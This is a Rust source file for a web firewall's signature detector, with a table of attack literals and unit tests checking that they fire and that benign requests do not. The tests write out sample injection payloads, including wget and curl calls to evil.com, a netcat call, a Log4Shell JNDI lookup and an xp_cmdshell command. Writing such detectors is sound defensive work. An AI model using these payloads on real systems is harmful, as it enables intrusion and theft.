use crate::detectors::{Detector, Group, Severity, Verdict};
use crate::request::Request;
use aho_corasick::AhoCorasick;

/// (literal, rule name, severity) — extend this table to add signatures.
///
/// **Design rule — precision over recall.** Each literal must be specific
/// enough that it (almost) never appears in benign traffic; the matcher is
/// ASCII case-insensitive and runs in O(input) regardless of table size
/// (aho-corasick), so adding signatures costs detection breadth, not
/// throughput. The constraint is the false-positive rate, validated by the
/// benign corpus — not CPU. Deliberately excluded: bare `;id`, `;ls`, etc.,
/// which collide with `sessionid=…;id=…` cookies and words like `details`.
const SIGNATURES: &[(&str, &str, Severity)] = &[
    ("../", "path_traversal", Severity::High),
    ("..\\", "path_traversal", Severity::High),
    ("/etc/passwd", "lfi", Severity::Critical),
    ("/etc/shadow", "lfi", Severity::Critical),
    ("/proc/self/environ", "lfi", Severity::Critical),
    // Stored lowercase; the case-insensitive matcher catches `/WEB-INF/`.
    ("/web-inf/", "lfi", Severity::High),
    ("$(", "rce_subshell", Severity::Critical),
    // Bare backtick: prone to false positives on Markdown/CMS/JSON traffic.
    // Kept for RCE coverage — retune (e.g. narrow the literal) if noisy.
    ("`", "rce_backtick", Severity::High),
    ("/bin/sh", "rce_shell", Severity::Critical),
    // Shell command-injection patterns. Each carries its metacharacter so
    // it can't match the bare command word inside benign content. The
    // documented round-2 `;wget` gap is closed here. `;nc ` / `|sh ` keep
    // a trailing space to avoid `;ncount` / `|shard`-style collisions.
    (";wget", "rce_cmd", Severity::Critical),
    (";curl", "rce_cmd", Severity::Critical),
    (";bash", "rce_cmd", Severity::Critical),
    (";nc ", "rce_cmd", Severity::Critical),
    ("|bash", "rce_cmd", Severity::Critical),
    ("|sh ", "rce_cmd", Severity::Critical),
    // Log4Shell JNDI lookup expression.
    ("${jndi:", "jndi_lookup", Severity::Critical),
    // PHP stream wrappers used for LFI→RCE and data exfiltration.
    ("php://", "php_wrapper", Severity::High),
    ("phar://", "php_wrapper", Severity::High),
    ("expect://", "php_wrapper", Severity::Critical),
    // SQL Server command execution stored procedure.
    ("xp_cmdshell", "rce_sql", Severity::Critical),
    ("sqlmap", "scanner_ua", Severity::Medium),
    ("nikto", "scanner_ua", Severity::Medium),
    ("nuclei", "scanner_ua", Severity::Medium),
];

/// Matches all known-bad literals in a single pass.
pub struct SignatureDetector {
    matcher: AhoCorasick,
}

impl SignatureDetector {
    /// Build a `SignatureDetector` with the compiled static signature set.
    pub fn new() -> SignatureDetector {
        let patterns: Vec<&str> = SIGNATURES.iter().map(|(p, _, _)| *p).collect();
        // Audited panic site (crate denies `expect_used`): the input is the
        // compile-time-constant `SIGNATURES` table, so a build failure here
        // is a programmer error caught on the first test run, never a runtime
        // condition reachable by request traffic. There is no meaningful
        // recovery — a WAF with no signature matcher must not start.
        #[allow(clippy::expect_used)]
        let matcher = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(&patterns)
            .expect("static signature set must build");
        SignatureDetector { matcher }
    }
}

impl Default for SignatureDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for SignatureDetector {
    fn group(&self) -> Group {
        Group::Signatures
    }

    fn inspect(&self, req: &Request) -> Vec<Verdict> {
        let mut verdicts = Vec::new();
        // A request can repeat one cheap literal thousands of times in a
        // buffered body. Report each static signature at most once so verdict
        // allocation is bounded by the signature table, while still scanning
        // every field for distinct patterns.
        let mut matched = [false; SIGNATURES.len()];
        // Header values (User-Agent, Cookie, Referer, X-*, etc.) are already
        // part of `inspectable_fields()` per the allow-list in `request.rs`.
        // Fields are raw bytes (NEW-I2); aho-corasick matches bytes natively.
        for field in req.inspectable_fields() {
            for m in self.matcher.find_iter(field) {
                let pattern = m.pattern().as_usize();
                if matched[pattern] {
                    continue;
                }
                matched[pattern] = true;
                let (lit, rule, sev) = SIGNATURES[pattern];
                verdicts.push(Verdict {
                    group: Group::Signatures,
                    rule,
                    severity: sev,
                    detail: format!("matched signature `{}`", lit),
                });
            }
        }
        verdicts
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
    use super::*;
    use std::net::IpAddr;

    fn ip() -> IpAddr {
        "1.2.3.4".parse().unwrap()
    }

    #[test]
    fn flags_path_traversal() {
        let req = Request::build(
            "GET",
            "h",
            "/files",
            "f=../../etc/passwd",
            vec![],
            vec![],
            false,
            ip(),
        );
        let v = SignatureDetector::new().inspect(&req);
        assert!(v
            .iter()
            .any(|x| x.rule == "path_traversal" || x.rule == "lfi"));
    }

    #[test]
    fn flags_scanner_user_agent() {
        let req = Request::build(
            "GET",
            "h",
            "/",
            "",
            vec![("user-agent".into(), "sqlmap/1.7".into())],
            vec![],
            false,
            ip(),
        );
        let v = SignatureDetector::new().inspect(&req);
        assert!(v.iter().any(|x| x.rule == "scanner_ua"));
    }

    #[test]
    fn benign_request_is_clean() {
        let req = Request::build(
            "GET",
            "h",
            "/about",
            "ref=home",
            vec![("user-agent".into(), "Mozilla/5.0".into())],
            vec![],
            false,
            ip(),
        );
        assert!(SignatureDetector::new().inspect(&req).is_empty());
    }

    // ── Header inspection (fix for v0.2 C-1) ────────────────────────────────

    #[test]
    fn flags_lfi_signature_in_cookie() {
        let req = Request::build(
            "GET",
            "h",
            "/",
            "",
            vec![("Cookie".into(), "id=1; path=/etc/passwd".into())],
            vec![],
            false,
            ip(),
        );
        let v = SignatureDetector::new().inspect(&req);
        assert!(v.iter().any(|x| x.rule == "lfi"), "verdicts: {v:?}");
    }

    #[test]
    fn flags_path_traversal_in_custom_x_header() {
        let req = Request::build(
            "GET",
            "h",
            "/",
            "",
            vec![("X-File-Path".into(), "../../etc/secret".into())],
            vec![],
            false,
            ip(),
        );
        let v = SignatureDetector::new().inspect(&req);
        assert!(
            v.iter().any(|x| x.rule == "path_traversal"),
            "verdicts: {v:?}"
        );
    }

    #[test]
    fn user_agent_still_detected_after_inspectable_field_consolidation() {
        // Regression guard: the User-Agent special-case that signatures.rs
        // used to apply was removed once Request::inspectable_fields() began
        // returning header values via the allow-list. This test makes sure
        // scanner-UA detection survives the refactor.
        let req = Request::build(
            "GET",
            "h",
            "/",
            "",
            vec![("user-agent".into(), "sqlmap/1.7".into())],
            vec![],
            false,
            ip(),
        );
        let v = SignatureDetector::new().inspect(&req);
        assert!(v.iter().any(|x| x.rule == "scanner_ua"));
        // And only once, because we no longer scan UA via both inspectable_fields
        // AND a separate special-case loop.
        assert_eq!(v.iter().filter(|x| x.rule == "scanner_ua").count(), 1);
    }

    #[test]
    fn repeated_literal_is_reported_once_across_all_fields() {
        let req = Request::build(
            "POST",
            "h",
            "/`",
            "payload=```",
            vec![("X-Template".into(), "```".into())],
            vec![b'`'; 16 * 1024],
            true,
            ip(),
        );
        let verdicts = SignatureDetector::new().inspect(&req);
        assert_eq!(
            verdicts
                .iter()
                .filter(|verdict| verdict.rule == "rce_backtick")
                .count(),
            1,
            "one static pattern must allocate at most one verdict: {verdicts:?}"
        );
        assert!(
            verdicts.len() <= SIGNATURES.len(),
            "verdict count must be bounded by the static signature table"
        );
    }

    // ── Signature pack expansion (Tier 2.9) ─────────────────────────────────

    /// Helper: build a GET whose single query value is `payload`, run the
    /// signature detector, return the matched rule names.
    fn rules_for_query_value(payload: &str) -> Vec<&'static str> {
        let raw_query = format!("p={payload}");
        let req = Request::build("GET", "h", "/", &raw_query, vec![], vec![], false, ip());
        SignatureDetector::new()
            .inspect(&req)
            .into_iter()
            .map(|v| v.rule)
            .collect()
    }

    #[test]
    fn flags_bare_command_injection_in_query() {
        // The documented `;wget` gap (round-2 benchmark robustness probe).
        for payload in [
            ";wget evil.com/x",
            ";curl evil.com",
            ";bash -i",
            "x;nc 10.0.0.1",
        ] {
            let rules = rules_for_query_value(payload);
            assert!(
                rules.contains(&"rce_cmd"),
                "expected rce_cmd for {payload:?}, got {rules:?}"
            );
        }
    }

    #[test]
    fn flags_pipe_to_shell_in_query() {
        for payload in ["cat /e|bash", "x|sh -c id"] {
            let rules = rules_for_query_value(payload);
            assert!(
                rules.contains(&"rce_cmd"),
                "expected rce_cmd for {payload:?}, got {rules:?}"
            );
        }
    }

    #[test]
    fn flags_log4shell_jndi_lookup() {
        let rules = rules_for_query_value("${jndi:ldap://evil/x}");
        assert!(rules.contains(&"jndi_lookup"), "got {rules:?}");
    }

    #[test]
    fn flags_php_wrappers() {
        assert!(
            rules_for_query_value("php://filter/convert.base64-encode/resource=index")
                .contains(&"php_wrapper")
        );
        assert!(rules_for_query_value("phar://malicious.phar/x").contains(&"php_wrapper"));
        assert!(rules_for_query_value("expect://id").contains(&"php_wrapper"));
    }

    #[test]
    fn flags_sensitive_lfi_targets() {
        assert!(rules_for_query_value("file=/etc/shadow").contains(&"lfi"));
        assert!(rules_for_query_value("file=/proc/self/environ").contains(&"lfi"));
    }

    #[test]
    fn flags_web_inf_case_insensitively() {
        // Signature is stored lowercase; the matcher is ASCII case-insensitive,
        // so the canonical uppercase `/WEB-INF/` must match.
        let rules = rules_for_query_value("/WEB-INF/web.xml");
        assert!(rules.contains(&"lfi"), "got {rules:?}");
    }

    #[test]
    fn flags_xp_cmdshell() {
        let rules = rules_for_query_value("'; EXEC xp_cmdshell 'dir'");
        assert!(rules.contains(&"rce_sql"), "got {rules:?}");
    }

    // ── Collision guards: the new signatures must not fire on benign traffic ─

    #[test]
    fn rce_cmd_does_not_fp_on_benign_semicolon_content() {
        // A cookie-style `key=val; key2=val2` string and a CSS-ish value
        // both contain `;` but none of the `;<cmd>` literals. Bare `;id`,
        // `;ls` etc. were deliberately excluded for exactly this reason.
        for benign in [
            "sessionid=abc123; csrftoken=xyz789; theme=dark",
            "style=color:red;font-weight:bold",
            "id=42;name=victor",
        ] {
            let rules = rules_for_query_value(benign);
            assert!(
                !rules.contains(&"rce_cmd"),
                "benign {benign:?} must not flag rce_cmd, got {rules:?}"
            );
        }
    }

    #[test]
    fn php_wrapper_does_not_fp_on_ordinary_php_url() {
        // A normal request *to* a .php endpoint must not match the
        // `php://` stream-wrapper signature.
        let req = Request::build(
            "GET",
            "h",
            "/index.php",
            "page=2",
            vec![],
            vec![],
            false,
            ip(),
        );
        let v = SignatureDetector::new().inspect(&req);
        assert!(
            !v.iter().any(|x| x.rule == "php_wrapper"),
            "ordinary .php URL must not flag php_wrapper: {v:?}"
        );
    }

    #[test]
    fn benign_request_with_new_signatures_present_is_still_clean() {
        // A realistic benign request must produce zero verdicts even with
        // the expanded signature table — the FPR-preservation guard.
        let req = Request::build(
            "GET",
            "shop.example",
            "/api/products",
            "category=shoes&sort=price&page=3",
            vec![
                ("user-agent".into(), "Mozilla/5.0 (Macintosh)".into()),
                ("cookie".into(), "sid=9f8e7d; cart=2".into()),
                ("referer".into(), "https://shop.example/home".into()),
            ],
            vec![],
            false,
            ip(),
        );
        assert!(
            SignatureDetector::new().inspect(&req).is_empty(),
            "benign request must stay clean under the expanded table"
        );
    }
}
